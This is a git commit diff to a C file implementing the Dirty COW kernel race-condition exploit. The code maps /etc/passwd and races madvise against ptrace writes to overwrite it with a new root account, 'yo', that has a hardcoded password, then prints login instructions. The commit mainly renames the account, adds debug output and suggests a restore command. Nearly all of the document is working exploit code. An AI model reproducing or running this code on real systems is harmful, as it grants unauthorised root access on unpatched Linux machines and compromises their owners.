a1740452ffc1c9b9bcb294f3668c966ed7bd795c
younes ismaili <ismailiyounes20@gmail.com>
2025-01-29 22:26:47 +0100

    fix dirty com exploit

--- scripts/dirty_cow.c
+++ scripts/dirty_cow.c
@@ -13,8 +13,9 @@
 #include <crypt.h>
 
 const char *target_file = "/etc/passwd";
+const char *backup_file = "/tmp/passwd_backup.bak";
 const char *hash_salt = "y0%y0";
-const char *password = "yopass";
+const char *password = "yo";
 
 int file_descriptor;     
 void *mapped_memory;     
@@ -32,22 +33,22 @@ struct UserDetails {
    char *shell;
 };
 
-char *format_passwd_entry(struct UserDetails user) 
-{
+char *format_passwd_entry(struct UserDetails user) {
   const char *template = "%s:%s:%d:%d:%s:%s:%s\n";  
-  int size = snprintf(NULL, 0, template, user.username, user.password_hash, user.user_id, user.group_id, user.info, user.home_directory, user.shell);
+
+  int size = snprintf(NULL, 0, template, user.username, user.password_hash,
+    user.user_id, user.group_id, user.info, user.home_directory, user.shell);
   char *formatted_entry = malloc(size + 1);  
 
-  sprintf(formatted_entry, template, user.username, user.password_hash, user.user_id, user.group_id, user.info, user.home_directory, user.shell);
+  sprintf(formatted_entry, template, user.username, user.password_hash,
+    user.user_id, user.group_id, user.info, user.home_directory, user.shell);
   return formatted_entry;  
 }
 
-void *run_madvise(void *arg) 
-{
+void *run_madvise(void *arg) {
   int counter = 0, result = 0;
 
-  while(counter < 200000000) 
-  {
+  while(counter < 200000000) {
     result += madvise(mapped_memory, 100, MADV_DONTNEED);  
     counter++;
   }
@@ -56,20 +57,24 @@ void *run_madvise(void *arg)
 
 int main() {
 
+ 
+
   struct UserDetails user;
-  user.username = "yo-root";
+  user.username = "yo";
   user.user_id = 0;
   user.group_id = 0;
-  user.info = "doubt>1:40";
+  user.info = "compromised";
   user.home_directory = "/root";
   user.shell = "/bin/bash";
 
   user.password_hash = crypt(password, hash_salt);
-  char *passwd_line = format_passwd_entry(user); 
+  char *passwd_line = format_passwd_entry(user);  
+  printf("Generated entry:\n%s\n", passwd_line);  
 
   file_descriptor = open(target_file, O_RDONLY);
   fstat(file_descriptor, &file_info);  
   mapped_memory = mmap(NULL, file_info.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, file_descriptor, 0);
+  printf("Memory map created at: %lx\n", (unsigned long)mapped_memory);  
 
   process_id = fork();
   if(process_id) {
@@ -89,7 +94,8 @@ int main() {
         o++;
       }
       i++;
-    } 
+    }
+    printf("ptrace write count: %d\n", count);  
   } else {
 
     pthread_create(&thread, NULL, run_madvise, NULL);
@@ -98,7 +104,8 @@ int main() {
     pthread_join(thread, NULL);  
   }
 
-  printf("completed! Verify the changes in %s.\n", target_file);  
-  printf("you can now log in with username: '%s' and the password %s.\n\n", user.username, password);  
+  printf("Completed! Verify the changes in %s.\n", target_file);  
+  printf("You can now log in with username: '%s' and the password you provided.\n\n", user.username);
+  printf("\nRestore the original file using: $ mv %s %s\n", backup_file, target_file);  
   return 0;  
 }
